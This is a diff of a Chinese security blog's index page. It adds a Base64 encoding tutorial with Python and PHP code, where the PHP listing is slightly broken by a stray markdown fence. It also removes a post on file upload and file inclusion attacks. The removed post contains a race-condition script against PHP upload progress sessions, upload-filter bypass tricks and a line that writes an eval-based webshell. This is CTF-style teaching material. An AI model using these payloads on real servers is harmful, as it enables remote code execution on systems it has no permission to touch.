@@ -198,6 +198,281 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d37b850031.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d37b850031.html" class="post-title-link" itemprop="url">BASE64编码原理学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-08 21:51:09" itemprop="dateCreated datePublished" datetime="2019-09-08T21:51:09+08:00">2019-09-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:21:38" itemprop="dateModified" datetime="2020-10-14T17:21:38+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/编码学习/" itemprop="url" rel="index"><span itemprop="name">编码学习</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Base64编码原理解析"><a href="#Base64编码原理解析" class="headerlink" title="Base64编码原理解析"></a>Base64编码原理解析</h1><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符</p>
+<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>‘A’ 转变为Base64编码：</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190906/15677508068341.png" alt="img"></p>
+<h2 id="表格流程"><a href="#表格流程" class="headerlink" title="表格流程"></a>表格流程</h2><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>A</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AIISC码</td>
+<td>65</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>二进制</td>
+<td>01000001</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>分组</td>
+<td>010000</td>
+<td>01000000</td>
+<td>=</td>
+<td>=</td>
+</tr>
+<tr>
+<td>十进制</td>
+<td>16</td>
+<td>16</td>
+<td>=</td>
+<td>=</td>
+</tr>
+<tr>
+<td>BASE64</td>
+<td>Q</td>
+<td>Q</td>
+<td>=</td>
+<td>=</td>
+</tr>
+</tbody></table>
+<h2 id="BASE64查询表"><a href="#BASE64查询表" class="headerlink" title="BASE64查询表"></a>BASE64查询表</h2><pre><code class="python">[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
+                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
+                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
+                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]</code></pre>
+<p>从上方流程可以简单知道BASE64是先转换为AIISC码再转换为二进制进而将8位bit分组为6位bit最后不足补0，如组数不足4组，那么就用等于号（“=”）补充。最后将分组的各组再转换为10进制，按照换回来的数字当做base64编码表的形式进行查表得出结果。例如16就是在上述表中找第17位也就是数组的第16位。</p>
+<h2 id="Python实现BASE64编码"><a href="#Python实现BASE64编码" class="headerlink" title="Python实现BASE64编码"></a>Python实现BASE64编码</h2><pre><code class="python">import re
+base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
+                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
+                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
+                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]
+def num_10_to_2(numbers):
+    result=[]
+    tmp=[]
+    return_str=&#39;&#39;
+    for number in numbers:
+        while number/2!=0:
+            result.append(int(number%2))
+            number=int(number/2)    
+        if(len(result)&lt;8):
+            for i in range(0,8-len(result)):
+                result.append(0)
+        number_2=&#39;&#39;
+        for i in range(0,len(result)):    
+            nums=len(result)-i-1
+            number_2=str(result[nums])+number_2
+        tmp.append(number_2)
+        result=[]
+    for i in range(len(tmp)):
+        return_str=return_str+tmp[i][::-1]
+    return return_str
+def num_2_to_10(number):
+    number=str(number)
+    nums=0
+    for i  in number:
+        nums=nums*2+int(i)
+    return nums            
+
+def str_to_aiisc(str_char):
+    tmp=[]
+    for i in str_char:
+         tmp.append(int(ord(i)))    
+    return tmp
+def cut_string(strings,lenth):
+    result =  re.findall(&#39;.{&#39;+str(lenth)+&#39;}&#39;,strings)
+    result.append(strings[(len(result)*lenth):]) #把最后几位加上
+    for i in range(0,6-len(result[len(result)-1])):
+        result[len(result)-1]=result[len(result)-1]+str(&#39;0&#39;)
+    return result
+def main(strings):
+    group_base = cut_string(num_10_to_2(str_to_aiisc(strings)),6)
+    if(group_base[len(group_base)-1])==&#39;000000&#39;:
+        group_base.pop(len(group_base)-1)
+    #print(group_base)
+    for i in group_base:
+        print(base64_table[num_2_to_10(i)], end=&#39;&#39;)
+    #print(4-int((len(group_base)/4)/0.25)%4)    
+    for i in range(4-int((len(group_base)/4)/0.25)%4):
+        print(&quot;=&quot;, end=&#39;&#39;)
+    print(&#39;\n&#39;)    
+if __name__==&#39;__main__&#39;:
+    main(&#39;A&#39;)</code></pre>
+<h2 id="PHP实现BASE64编码"><a href="#PHP实现BASE64编码" class="headerlink" title="PHP实现BASE64编码"></a>PHP实现BASE64编码</h2><pre><code class="php">&lt;?php
+function num_10_to_2($number){
+    $result=[];
+    $tmp=[];
+    $number_2=&#39;&#39;;
+    for($i=0;$i&lt;count($number);$i++){
+        while ($number[$i]/2!=0) {
+        array_push($result,intval($number[$i]%2));
+        $number[$i]=intval($number[$i]/2);
+        }
+        for($j=0;$j&lt;count($result);$j++){
+            $nums = count($result)-$j-1;
+            $number_2 = strval($result[$nums]).$number_2;
+        }
+        ///echo $number_2.&#39;&lt;br&gt;&#39;;
+        array_push($tmp,$number_2);
+        $number_2=&#39;&#39;;
+        $result=[];
+    }
+    //var_dump($tmp);
+    for($j=0;$j&lt;count($tmp);$j++){
+    if(strlen($tmp[$j])&lt;8){
+        for($i=0;$i&lt;8-strlen($tmp[$j]);$i++){
+            $tmp[$j]=$tmp[$j].&#39;0&#39;;
+        }
+        $tmp[$j]=strrev($tmp[$j]);
+        //echo $tmp[$j].&#39;&lt;br&gt;&#39;;
+    }
+    }
+
+```
+return implode($tmp);
+```
+
+}
+function num_2_to_10($number){
+    $number = strval($number);
+    $nums = 0;
+    for($i=0;$i&lt;strlen($number);$i++){
+        $nums = $nums*2+intval(substr($number,$i,1));
+    }
+    return $nums;
+}
+function str_to_aiisc($str_char){
+    $result=[];
+    $str_char = strval($str_char);
+    for($i=0;$i&lt;strlen($str_char);$i++){
+        array_push($result,intval(ord(substr($str_char,$i,1))));
+    }
+    return $result;
+}
+function cut_string($number,$lenth){
+    $number = strval($number);
+    $number =  str_split($number,intval($lenth));
+    for($i=0;$i&lt;count($number);$i++){
+        if(strlen($number[$i])&lt;6){
+            $number[$i]=$number[$i].str_repeat(&#39;0&#39;, 6-strlen($number[$i]));
+        }
+    }
+    return $number;
+}
+function base64Encode($strings){
+    $base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
+                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
+                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
+                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;];
+    $result=&#39;&#39;;
+    $group_bas64 = cut_string(num_10_to_2(str_to_aiisc($strings)),6);
+    for($i=0;$i&lt;count($group_bas64);$i++){
+        $result=$result.$base64_table[num_2_to_10($group_bas64[$i])];
+    }
+    for($i=0;$i&lt;4-intval((count($group_bas64)/4)/0.25)%4;$i++){
+        $result=$result.&quot;=&quot;;
+    }
+    return $result;
+}
+ echo base64Encode(&#39;ABaaa&#39;)
+?&gt;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d72174f7cb.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1753,215 +2028,6 @@ print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d42c963778.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d42c963778.html" class="post-title-link" itemprop="url">上传漏洞&文件包含总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-08-09 10:05:54" itemprop="dateCreated datePublished" datetime="2019-08-09T10:05:54+08:00">2019-08-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:09:34" itemprop="dateModified" datetime="2020-10-14T17:09:34+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <ul>
-<li><strong>时间:2019年8月5日16:00:28</strong>        </li>
-<li><strong>地点：福州大学</strong></li>
-</ul>
-<h2 id="文件包含漏洞利用技巧"><a href="#文件包含漏洞利用技巧" class="headerlink" title="文件包含漏洞利用技巧"></a>文件包含漏洞利用技巧</h2><h4 id="Apache日志文件包含"><a href="#Apache日志文件包含" class="headerlink" title="Apache日志文件包含"></a>Apache日志文件包含</h4><p>Apache会将所有请求写入日志文件中，所以如果在URl中写入一句话木马，再配合文件包含漏洞将可能直接getshell。</p>
-<p>例如:提交一个get请求（使用burpsuite或者curl命令防止被url编码）</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649879122522.png" alt></p>
-<h4 id="PHP-SESSION进度文件包含"><a href="#PHP-SESSION进度文件包含" class="headerlink" title="PHP_SESSION进度文件包含"></a>PHP_SESSION进度文件包含</h4><p>PHP5.4会将上传的进度和时间储存在SESSION中在上传结束之后会清空SESSION,如果存在文件包含的漏洞可以采取条件竞争的形式使得包含文件成功，执行任意代码。</p>
-<p>例如服务器存在一文件readme.txt是我们上传的小马文件，我们需要将其名字改成xiaoma.php,并且网站存在文件包含漏洞。</p>
-<p>实验代码：</p>
-<pre><code class="php">&lt;?php
-$b=$_GET[&#39;f&#39;];
-include &quot;$b&quot;;
-?&gt;</code></pre>
-<p>利用脚本：</p>
-<pre><code class="python">import requests
-import threading
-
-url=&#39;http://www.sql.com/test.php&#39;
-r=requests.session()
-headers={
-    &quot;Cookie&quot;:&#39;PHPSESSID=123&#39;
-}
-def POST():
-    while True:
-        file={
-            &quot;upload&quot;:(&#39;&#39;,&#39;&#39;)  #上传无效的空文件
-        }
-        data={
-            &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#39;&lt;?php rename(&quot;readme.txt&quot;,&quot;xiaoma.php&quot;);?&gt;&#39;     #恶意进度信息，
-        }
-        r.post(url,files=file,headers=headers,data=data)
-
-def READ():
-    while True:
-        event.wait()
-        t=r.get(&quot;http://www.sql.com/test.php?f=../../tmp/tmp/sess_123&quot;)
-        if &#39;flag&#39; not in t.text:
-            print(&#39;[+]retry&#39;)
-        else:
-            print(t.text)
-            event.clear()
-event=threading.Event()
-event.set()
-threading.Thread(target=POST,args=()).start()
-threading.Thread(target=READ,args=()).start()
-threading.Thread(target=READ,args=()).start()
-threading.Thread(target=READ,args=()).start()</code></pre>
-<p>实验流程：</p>
-<ul>
-<li><p>上传小马图片得知小马相对地址</p>
-</li>
-<li><p>构造脚本：在cookie中定义PHPSESSIONID（例如：PHPSESSIONID=123）</p>
-<ul>
-<li>将会在var/tmp/tmp（linux环境）生成一个叫sess_123的文件</li>
-<li>将会储存PHP_SESSION_UPLOAD_PROGRESS进度信息（例如：PHP_SESSION_UPLOAD_PROGRESS=<?php rename("readme.txt","xiaoma.php");?>）</li>
-<li>使用文件包含漏洞包含该含义PHP恶意代码的文件将会执行修改文件的代码</li>
-<li>使用多线程同时竞争</li>
-</ul>
-</li>
-</ul>
-<p>sess_123文件内容</p>
-<pre><code>upload_progress_&lt;?php rename(&quot;readme.txt&quot;,&quot;readme.php&quot;);?&gt;|a:5:{s:10:&quot;start_time&quot;;i:1564991083;s:14:&quot;content_length&quot;;i:288;s:15:&quot;bytes_processed&quot;;i:288;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:6:&quot;upload&quot;;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1564991083;s:15:&quot;bytes_processed&quot;;i:0;}}}</code></pre><p>实验效果：<br><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649914396031.png" alt></p>
-<p>修改后变成xiaoma.php（当然可以还可以利用代码生成写入一句话木马）</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649916186321.png" alt></p>
-<p><em>（该方法利用出现在强网杯JustSoSo题目中的非预期解）</em></p>
-<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>前端验证，直接使用burp抓包修改名字。或者浏览器禁用js</p>
-<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>上传可执行脚本，修改Content-Type</p>
-<h4 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h4><ul>
-<li><p><strong>大小写绕过：</strong>Php、PhP、pHp等可Fuzz测试得到黑名单</p>
-</li>
-<li><p><strong>空格截断：</strong>在后缀后面使用一个空格截断检测</p>
-</li>
-<li><p><strong>重写绕过：</strong>主要用于将php这个关键字进行替换为空的例如如下代码</p>
-</li>
-</ul>
-<pre><code class="php">&lt;?php
-$type=str_replace(&#39;php&#39;,&#39;&#39;,$a);
-?&gt;</code></pre>
-<p>可以使用重写直接绕过该替换例如修改为：1.pphphp ,将可以直接绕过过滤</p>
-<ul>
-<li><p><strong>特殊后缀名绕过：</strong>ASP语言类：.asa    .cer    .cdx</p>
-<pre><code>                          PHP语言类:    .php3    .php4    .php5
-                               .net语言类：.ashx</code></pre></li>
-<li><p><strong>文件头检测绕过：</strong>使用图片马或者给小马加个图片头</p>
-</li>
-<li><p><strong>分布式配置文件绕过：</strong>能够上传或者修改.htacess文件，是服务器在该文件夹解析jpg文件。</p>
-</li>
-<li><p><strong>分布式配置文件上传漏洞的实例</strong></p>
-</li>
-</ul>
-<ol>
-<li><p>建立.htaccess文件,内容如下:</p>
-<pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;
-SetHandler application/x-httpd-php
-&lt;/FilesMatch&gt;</code></pre><p>并将其上传至服务器中</p>
-</li>
-</ol>
-<p>并将其上传至服务器中</p>
-<ol start="2">
-<li>上传php木马文件名包含jpg即可造成解析</li>
-</ol>
-<ul>
-<li><strong>上传文件类型00截断</strong></li>
-</ul>
-<p>burpsuite上传抓包，16进制下修改文件名与后缀之间的一个字符的16进制改成00；</p>
-<p>例如：</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15650128192120.png" alt></p>
-<h4 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h4><ul>
-<li><strong>Apache2.2.11解析漏洞</strong></li>
-</ul>
-<p>例如：cimer.php.owf.rar  “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把cimer.php.owf.rar解析成php</p>
-<ul>
-<li><strong>IIS6.0解析漏洞</strong></li>
-</ul>
-<p><strong>1.目录解析漏洞</strong></p>
-<p>在网站下建立文件夹的名字为 .asp /.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行</p>
-<p>例如： /cimer.asp/1.jpg 将会被按照正常的asp文件进行解析<br><strong>2.文件解析漏洞</strong></p>
-<p>在IIS6.0下，分号后面的不被解析，如 cimer.asp;.jpg会被当做cimer.asp<br>还有iis6.0默认的可执行文件除了asp还包含.asa、.cer、.cdx</p>
-<p>Nginx解析漏洞<br>在默认Fast-CGI开启状况下,攻击者上传一个名字为cimer.jpg，内容为</p>
-<pre><code class="PHP">&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</code></pre>
-<p>然后访问cimer.jpg/.php,在这个目录下就会生成一句话木马shell.php</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2033,7 +2099,7 @@ SetHandler application/x-httpd-php
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-count">63</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2104,12 +2170,12 @@ SetHandler application/x-httpd-php
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">225k</span>
+    <span title="站点总字数">229k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:25</span>
+    <span title="站点阅读时长">3:28</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
